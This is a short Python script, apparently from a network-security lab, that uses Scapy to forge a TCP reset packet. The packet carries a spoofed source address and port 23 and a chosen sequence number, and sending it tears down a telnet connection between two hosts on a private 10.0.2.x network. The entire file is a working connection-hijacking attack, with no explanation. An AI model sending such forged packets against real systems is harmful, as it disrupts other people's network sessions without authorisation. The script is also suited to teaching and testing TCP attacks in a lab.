#!/usr/bin/python3
import sys
from scapy.all import *

ip = IP(src="10.0.2.15", dst="10.0.2.6")
tcp = TCP(sport=23,dport=47344,flags="R", seq=3280934257)#, ack=499874896)
pkt = ip/tcp
ls(pkt)
send(pkt,verbose=1)
